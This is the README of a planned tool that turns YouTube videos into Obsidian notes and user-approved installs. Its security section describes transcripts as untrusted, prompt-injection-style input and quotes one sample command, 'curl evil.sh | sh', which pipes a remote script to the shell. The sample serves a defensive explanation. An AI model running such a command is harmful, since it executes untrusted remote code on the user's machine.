# Self-Learning Agent

**Point your coding agent at a video. Get a note you'll keep, and a setup you approved.**

> **Status: design phase.** The architecture is settled and written up in
> [PLAN.md](PLAN.md). No working code yet — v1 is milestones M0–M4. Watch the repo
> if you want to be there when it lands.

---

## The problem

Creators like [Greg Isenberg](http://youtube.com/@GregIsenberg) ship videos about
building with AI agents faster than anyone can absorb them — which MCP server to use,
which repo to clone, which prompting pattern actually works. The advice is good. The
throughput is the problem.

By the time you need a technique, you've forgotten which video it was in, and you
definitely haven't set it up.

This turns that firehose into two things you can use: **a note in your vault**, and
**a list of setup actions you explicitly approve**.

## What it does

```bash
/learn https://youtube.com/watch?v=...     # one video
/learn @GregIsenberg --last 5              # a channel's recent uploads
```

It pulls the transcript, description, and chapters; checks what you already have
installed; writes an Obsidian note; and — only if you approve, item by item —
installs and configures what's worth having.

### It knows what you already own

Before writing anything, the pipeline inventories your installed skills, MCP servers,
and CLIs. So the note says:

> Video recommends Playwright MCP — **you already have it**. The new part is his
> selector-retry pattern, which is worth adding as a skill.

instead of handing you a list of things you installed months ago. It gets *sharper*
the more you already have, not noisier.

### Two kinds of video, two payoffs

The pipeline classifies the source and shifts the weight of the note accordingly:

| Class | Example | What you get |
|---|---|---|
| **tooling** | "I built this with Claude Code and 3 MCP servers" | Concrete setup actions, ready to approve |
| **conceptual** | "5 AI business ideas for 2026" | Developed project ideas — stack, first command, honest time estimate |
| **mixed** | Both | Both |

For a conceptual video there is usually **nothing to install, and it says so.**
Which brings us to the design rule that matters most:

### It's allowed to find nothing

Most videos teach nothing installable. If a tool like this is *expected* to produce
actions, it will manufacture them — and that is precisely what makes these tools
untrustworthy. `proposals: []` is a valid, common, correct output here.

Same reason every note carries a mandatory **Gaps & uncertainty** section: videos demo
things on screen while the audio says "just paste this in here," and auto-captions
mangle the exact words that matter (`MCP` → `mcp`, `n8n` → `an eight n`). The note
tells you what it couldn't see rather than papering over it.

## Security

This tool reads text written by strangers and can install software. That deserves a
real answer, not a disclaimer.

**The agent never emits a shell command.** A proposal can only name a package on a
known registry:

```json
{ "kind": "package", "manager": "npm", "name": "@playwright/mcp" }
```

The Python layer renders the command from a template. There is no path from transcript
text to `bash` — a video description containing `curl evil.sh | sh` cannot become an
executed command, because "a command" is not something a proposal is able to express.

On top of that:

- **Risk tiers.** Anything off the allowlist, anything needing a secret, anything
  cloned-and-run is tier `high` — printed as manual instructions, **never** automated.
- **Secrets are never handled.** If a tool needs an API key, you get the key *name* in
  a `.env` stub. No value is ever read, written, or transmitted.
- **Every action is reversible.** Each applied proposal records its own undo command.
- **Nothing outside your vault is touched before you approve.**

Full model in [PLAN.md §8](PLAN.md). The adversarial-transcript test suite is the one
that isn't allowed to go red.

## Design

```
PLAN phase — no side effects outside the vault
  resolve → dedupe → fetch → inventory → synthesize → write note
                        ↓
              ██ YOU REVIEW THE NOTE ██
                        ↓
APPLY phase — touches your machine
  gate → apply → record
```

Deterministic work (fetching, caching, deduping, rendering, guarded installs) is
tested Python. Judgment (classification, synthesis, authoring skills) is the agent.
The seam between them is a validated JSON contract, which is also what makes the
security model enforceable.

**No API keys required.** `yt-dlp` handles channel listings and captions anonymously.

## Roadmap

| | Milestone | |
|---|---|---|
| M0 | Repo skeleton, CI, license | |
| M1 | Fetch + cache + ledger | **v1** |
| M2 | Inventory of installed skills/MCPs | **v1** |
| M3 | `/learn` → vault note + proposals | **v1** |
| M4 | Approval gate + apply | **v1** |
| M5 | Channel batch processing | |
| M6 | Scheduled polling | |
| M7 | Web frontend — paste any link | |

## Known limitations

1. **Screen content is lost.** Frame sampling with vision is deferred as too expensive
   for v1; description links cover most of the gap.
2. **ASR mangles product names.** Mitigated by reading the human-typed description, not
   solved. Low-confidence names are flagged in the note.
3. **No members-only or paywalled content.**
4. **Quality is bounded by the creator.** This faithfully relays what a video claims.
   It does not independently verify that the advice is any good.

## Contributing

Early — the most useful contribution right now is disagreement with
[PLAN.md](PLAN.md). Open an issue.

Once M1 lands, transcript fixtures for the test suite are the highest-value
contribution, especially adversarial ones.

## License

MIT
